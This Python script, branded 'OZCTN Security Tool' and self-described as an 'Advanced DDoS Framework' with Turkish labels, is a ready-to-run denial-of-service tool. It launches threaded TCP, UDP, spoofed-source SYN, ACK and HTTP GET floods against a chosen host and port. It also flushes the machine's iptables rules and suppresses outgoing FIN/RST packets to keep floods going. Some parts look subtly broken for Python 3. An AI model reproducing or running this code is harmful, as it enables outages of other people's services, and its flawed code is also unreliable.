#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
from time import sleep
from threading import Thread, active_count
from os import system, geteuid
import random
import string
import signal
import ssl
import argparse
import sys
import time
import struct

# ██████╗ ███████╗ ██████╗████████╗███╗   ██╗
# ██╔══██╗╚══███╔╝██╔════╝╚══██╔══╝████╗  ██║
# ██████╔╝  ███╔╝ ██║        ██║   ██╔██╗ ██║
# ██╔═══╝  ███╔╝  ██║        ██║   ██║╚██╗██║
# ██║     ███████╗╚██████╗   ██║   ██║ ╚████║
# ╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝
# 🚀 OZCTN Developer - Advanced Security Tool v3.0

örnek_kullanım = ''' 
╔════════════════════════════════════════════════╗
║                 💡 İPUÇLARI                   ║
╠════════════════════════════════════════════════╣
║ • Hedef sayfa boyutu 1500+ bayt olmalıdır     ║
║ • Sadece test sistemlerinde kullanın          ║
║ • Root yetkisi gereklidir                     ║
╚════════════════════════════════════════════════╝

╔════════════════════════════════════════════════╗
║              📚 ÖRNEK KULLANIMLAR             ║
╠════════════════════════════════════════════════╣
║ python %s example.com -p 80 -http            ║
║ python %s example.com -p 443 -ssl -http      ║
║ python %s example.com -p 21 -yük 68656c6c6f  ║
║ python %s example.com -p 22 -t 500           ║
║ python %s example.com -p 80 -mode all        ║
╚════════════════════════════════════════════════╝
''' % (sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0])

ayrıştırıcı = argparse.ArgumentParser(
    description='╔════════════════════════════════════════════════╗\n║           🚀 OZCTN SECURITY TOOL v3.0           ║\n╚════════════════════════════════════════════════╝',
    epilog=örnek_kullanım, 
    formatter_class=argparse.RawTextHelpFormatter
)

ayrıştırıcı._action_groups.pop()
gerekli = ayrıştırıcı.add_argument_group('╔════════════════════════════════════════════════╗\n║                 🔧 GEREKLİ AYARLAR                ║\n╚════════════════════════════════════════════════╝')
opsiyonel = ayrıştırıcı.add_argument_group('╔════════════════════════════════════════════════╗\n║                🎛️  OPSİYONEL AYARLAR              ║\n╚════════════════════════════════════════════════╝')

gerekli.add_argument('hedef', help='🎯 Saldırı yapılacak hedef adres (örn: example.com)')
gerekli.add_argument('-p', dest='port', help='🔌 Hedef port numarası (örn: 80, 443)', type=int, required=True)

opsiyonel.add_argument('-t', dest='THREADS', type=int, default=500, help='🧵 Eşzamanlı thread sayısı (varsayılan: 500)')
opsiyonel.add_argument('-ssl', action='store_true', help='🔒 SSL/TLS şifreleme kullan')
opsiyonel.add_argument('-http', action='store_true', help='🌐 HTTP başlıkları ekle')
opsiyonel.add_argument('-yük', dest='payload', help='📦 Özel hex formatında yük (örn: 48656c6c6f)')
opsiyonel.add_argument('-mode', dest='mode', default='tcp', choices=['tcp', 'udp', 'syn', 'ack', 'all'], 
                      help='⚡ Saldırı modu: tcp, udp, syn, ack, all (varsayılan: tcp)')

print("\n" + "╔════════════════════════════════════════════════╗")
print("║           🚀 OZCTN SECURITY TOOL v3.0           ║")
print("║           🔥 Advanced DDoS Framework           ║")
print("║              ⚡ ENHANCED IPTABLES              ║")
print("╚════════════════════════════════════════════════╝\n")

args = ayrıştırıcı.parse_args()

# 📊 İstatistik değişkenleri
bağlantılar = 0
düşürülen = 0
yükler = 0
paketler = 0
port = args.port

# 🔗 Hedef URL'yi temizle
hedef = args.hedef.replace('http://','').replace('https://','')

# 📍 Yol bilgisini ayır
if '/' in hedef and args.http:
    yol = hedef[hedef.find('/'):]
    hedef = hedef[:hedef.find('/')]
else:
    yol = '/'

# 📦 Yük işleme
try:
    if args.payload:
        yük = args.payload.decode('hex')
    else:
        yük = ''
except:
    print('╔════════════════════════════════════════════════╗')
    print('║                    ❌ HATA                     ║')
    print('╠════════════════════════════════════════════════╣')
    print('║ Yük hex formatında olmalıdır!                 ║')
    print('║ Örnek: 48656c6c6f (Hello)                     ║')
    print('╚════════════════════════════════════════════════╝')
    sys.exit()

# ⚠️ Root kontrolü
if geteuid() != 0:
    print('╔════════════════════════════════════════════════╗')
    print('║                    ⚠️ UYARI                    ║')
    print('╠════════════════════════════════════════════════╣')
    print('║ Bu aracı root yetkisiyle çalıştırmanız         ║')
    print('║ gerekiyor!                                     ║')
    print('║                                                ║')
    print('║ sudo python %s                          ║' % sys.argv[0])
    print('╚════════════════════════════════════════════════╝')
    sys.exit()

# 🛑 CTRL+C yakalama
durdur = False
def sinyal_yakalayıcı(sinyal, kare):
    global durdur
    print("\n╔════════════════════════════════════════════════╗")
    print("║                  🛑 DURDURULUYOR               ║")
    print("╚════════════════════════════════════════════════╝")
    durdur = True

signal.signal(signal.SIGINT, sinyal_yakalayıcı)

# 🔧 Gelişmiş iptables kurulumu
def iptables_kur(hedef_ip, port):
    print("╔════════════════════════════════════════════════╗")
    print("║              🛡️  GÜVENLİK ÖNLEMLERİ           ║")
    print("╠════════════════════════════════════════════════╣")
    
    # Mevcut kuralları temizle
    system('iptables -F 2>/dev/null')
    system('iptables -X 2>/dev/null')
    
    # TCP saldırıları için kurallar
    kurallar = [
        # FIN ve RST paketlerini engelle
        f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP',
        f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP',
        
        # SYN flood korumasını devre dışı bırak
        f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} -m limit --limit 1000/s -j ACCEPT',
        f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} -j ACCEPT',
        
        # UDP için kurallar
        f'iptables -A OUTPUT -d {hedef_ip} -p udp --dport {port} -j ACCEPT',
        
        # ICMP engelle (ping flood için)
        f'iptables -A OUTPUT -d {hedef_ip} -p icmp -j DROP',
        
        # Connection tracking'i devre dışı bırak
        f'iptables -t raw -A PREROUTING -d {hedef_ip} -j NOTRACK',
        f'iptables -t raw -A OUTPUT -d {hedef_ip} -j NOTRACK'
    ]
    
    for kural in kurallar:
        system(kural + ' 2>/dev/null')
        print(f"║  ✅ {kural[:45]}... ║")
        sleep(0.1)
    
    print("║  🛡️  Gelişmiş güvenlik kuralları uygulandı   ║")
    print("╚════════════════════════════════════════════════╝")

# 🧹 İptables temizleme
def iptables_temizle(hedef_ip, port):
    temizleme_kuralları = [
        f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP',
        f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP',
        f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} -m limit --limit 1000/s -j ACCEPT',
        f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} -j ACCEPT',
        f'iptables -D OUTPUT -d {hedef_ip} -p udp --dport {port} -j ACCEPT',
        f'iptables -D OUTPUT -d {hedef_ip} -p icmp -j DROP',
        f'iptables -t raw -D PREROUTING -d {hedef_ip} -j NOTRACK',
        f'iptables -t raw -D OUTPUT -d {hedef_ip} -j NOTRACK'
    ]
    
    for kural in temizleme_kuralları:
        system(kural + ' 2>/dev/null')
    
    system('iptables -F 2>/dev/null')
    system('iptables -X 2>/dev/null')

# 🔄 Rastgele string üreteci
def rastgele_string(boyut=random.randint(3, 8), karakterler=string.ascii_letters + string.digits):
    return ''.join(random.choice(karakterler) for _ in range(boyut))

# 🌐 HTTP yükü oluşturma
def http_yükü_oluştur():
    yük = 'GET %s?%s=%s HTTP/1.1\r\n' % (yol, rastgele_string(), rastgele_string())
    yük += 'Host: %s\r\n' % hedef
    yük += 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) OZCTN-Security\r\n'
    yük += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    yük += 'Accept-Language: tr-TR,tr;q=0.9,en;q=0.8\r\n'
    yük += 'Cache-Control: no-cache\r\n'
    yük += 'Connection: keep-alive\r\n'
    yük += 'Content-Length: 1000\r\n'
    yük += '\r\n%s\r\n\r\n' % ('A' * 1000)
    return yük

# 📊 İstatistik kutusu gösterme
def istatistik_göster():
    print("╔════════════════════════════════════════════════╗")
    print("║           🚀 OZCTN SECURITY TOOL v3.0         ║")
    print("║           🔥 ENHANCED IPTABLES MODE           ║")
    print("╠════════════════════════════════════════════════╣")
    print("║  🎯 HEDEF: %-33s ║" % (hedef[:33] + '...' if len(hedef) > 33 else hedef))
    print("║  📍 PORT: %-34s ║" % port)
    print("║  🔧 THREAD: %-32s ║" % args.THREADS)
    print("║  ⚡ MOD: %-35s ║" % args.mode.upper())
    print("╠════════════════════════════════════════════════╣")
    print("║  🔥 AKTİF BAĞLANTILAR: %-23s ║" % bağlantılar)
    print("║  📦 GÖNDERİLEN YÜKLER: %-22s ║" % yükler)
    print("║  📨 TOPLAM PAKETLER: %-23s ║" % paketler)
    print("║  ❌ DÜŞÜRÜLEN PAKETLER: %-22s ║" % düşürülen)
    print("║  ⚡ AKTİF THREAD'LER: %-24s ║" % (active_count()-1))
    print("╠════════════════════════════════════════════════╣")
    print("║  🕒 SÜRE: %-34s ║" % time.strftime("%H:%M:%S"))
    print("║  📡 DURUM: %-32s ║" % ("AKTİF" if not durdur else "DURDURULDU"))
    print("╠════════════════════════════════════════════════╣")
    print("║  💀 CTRL+C - Saldırıyı Durdur                 ║")
    print("╚════════════════════════════════════════════════╝")

# ⚡ TCP Saldırısı
def tcp_saldırı(hedef_ip, yük):
    global bağlantılar, düşürülen, yükler, paketler
    while not durdur:
        try:
            soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soket.settimeout(2)
            
            soket.connect((hedef_ip, port))
            bağlantılar += 1
            
            if args.ssl:
                soket = ssl.wrap_socket(soket, cert_reqs=ssl.CERT_NONE)
            
            if args.http and not args.payload:
                yük = http_yükü_oluştur()
            
            soket.send(yük)
            yükler += 1
            paketler += 1
            
            # Çoklu paket gönderimi
            for _ in range(random.randint(1, 5)):
                try:
                    soket.send(yük)
                    paketler += 1
                except:
                    break
                    
            soket.close()
            
        except Exception:
            düşürülen += 1

# 🌊 UDP Saldırısı
def udp_saldırı(hedef_ip):
    global paketler, düşürülen
    while not durdur:
        try:
            soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Büyük UDP paketleri
            yük = random._urandom(1450)  # MTU boyutuna yakın
            soket.sendto(yük, (hedef_ip, port))
            paketler += 1
            soket.close()
        except Exception:
            düşürülen += 1

# 🎯 SYN Flood Saldırısı
def syn_saldırı(hedef_ip):
    global paketler, düşürülen
    while not durdur:
        try:
            # Raw socket oluştur
            soket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            # Rastgele kaynak IP
            kaynak_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            
            # IP başlığı
            ip_başlık = struct.pack('!BBHHHBBH4s4s',
                69, 0, 40, random.randint(1, 65535), 0, 64, 6, 0,
                socket.inet_aton(kaynak_ip), socket.inet_aton(hedef_ip))
            
            # TCP başlığı (SYN flag)
            kaynak_port = random.randint(1024, 65535)
            tcp_başlık = struct.pack('!HHLLBBHHH',
                kaynak_port, port, random.randint(1, 4294967295), 0,
                5 << 4, 2, 8192, 0, 0)  # SYN flag = 2
            
            soket.sendto(ip_başlık + tcp_başlık, (hedef_ip, 0))
            paketler += 1
            
        except Exception:
            düşürülen += 1

# 🔥 ACK Flood Saldırısı
def ack_saldırı(hedef_ip):
    global paketler, düşürülen
    while not durdur:
        try:
            soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soket.settimeout(1)
            soket.connect((hedef_ip, port))
            
            # ACK paketleri gönder
            for _ in range(10):
                try:
                    soket.send(b'\x00' * 100)
                    paketler += 1
                except:
                    break
                    
            soket.close()
        except Exception:
            düşürülen += 1

# 🚀 Ana saldırı fonksiyonu
def saldırı_başlat(hedef_ip):
    global durdur
    
    if args.mode == 'tcp' or args.mode == 'all':
        for i in range(args.THREADS // 2):
            if durdur: break
            thread = Thread(target=tcp_saldırı, args=(hedef_ip, yük))
            thread.daemon = True
            thread.start()
    
    if args.mode == 'udp' or args.mode == 'all':
        for i in range(args.THREADS // 4):
            if durdur: break
            thread = Thread(target=udp_saldırı, args=(hedef_ip,))
            thread.daemon = True
            thread.start()
    
    if args.mode == 'syn' or args.mode == 'all':
        for i in range(args.THREADS // 4):
            if durdur: break
            thread = Thread(target=syn_saldırı, args=(hedef_ip,))
            thread.daemon = True
            thread.start()
    
    if args.mode == 'ack' or args.mode == 'all':
        for i in range(args.THREADS // 4):
            if durdur: break
            thread = Thread(target=ack_saldırı, args=(hedef_ip,))
            thread.daemon = True
            thread.start()

if __name__ == '__main__':
    try:
        hedef_ip = socket.gethostbyname(hedef)
        
        print("╔════════════════════════════════════════════════╗")
        print("║              ⚡ SİSTEM HAZIRLIĞI              ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  🔍 Hedef IP: %-30s ║" % hedef_ip)
        print("║  🔧 Port: %-34s ║" % port)
        print("║  🧵 Thread: %-32s ║" % args.THREADS)
        print("║  🔒 SSL: %-35s ║" % ("AKTİF" if args.ssl else "PASİF"))
        print("║  🌐 HTTP: %-34s ║" % ("AKTİF" if args.http else "PASİF"))
        print("║  ⚡ Mod: %-35s ║" % args.mode.upper())
        print("╚════════════════════════════════════════════════╝")
        
        # Gelişmiş iptables kurallarını uygula
        iptables_kur(hedef_ip, port)
        
        sleep(2)
        
        print("╔════════════════════════════════════════════════╗")
        print("║              🚀 SALDIRI BAŞLATILIYOR         ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  Çoklu saldırı vektörleri aktifleştiriliyor...║")
        print("╚════════════════════════════════════════════════╝")
        sleep(1)
        
        # 🚀 Saldırıyı başlat
        saldırı_başlat(hedef_ip)
        
        # 📊 İstatistik gösterimi
        başlangıç_zamanı = time.time()
        while not durdur:
            if active_count() == 1:
                break
                
            istatistik_göster()
            sleep(0.3)
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print("╔════════════════════════════════════════════════╗")
        print("║                    ❌ HATA                     ║")
        print("╠════════════════════════════════════════════════╣")
        print("║ %-42s ║" % str(e))
        print("╚════════════════════════════════════════════════╝")
    finally:
        # 🧹 Temizlik işlemleri
        durdur = True
        sleep(2)
        
        iptables_temizle(hedef_ip, port)
        
        toplam_süre = time.time() - başlangıç_zamanı
        print("\n╔════════════════════════════════════════════════╗")
        print("║                📊 SALDIRI SONU                ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  ✅ Toplam Bağlantı: %-25s ║" % bağlantılar)
        print("║  📦 Toplam Yük: %-28s ║" % yükler)
        print("║  📨 Toplam Paket: %-26s ║" % paketler)
        print("║  ❌ Toplam Düşürülen: %-24s ║" % düşürülen)
        print("║  ⏱️  Toplam Süre: %-26s ║" % f"{toplam_süre:.1f}s")
        print("║  ⚡ Ortalama RPS: %-25s ║" % f"{(bağlantılar/toplam_süre):.1f}/s")
        print("║  📊 Ortalama PPS: %-25s ║" % f"{(paketler/toplam_süre):.1f}/s")
        print("╠════════════════════════════════════════════════╣")
        print("║           🎉 OZCTN TOOL KAPATILDI            ║")
        print("╚════════════════════════════════════════════════╝")
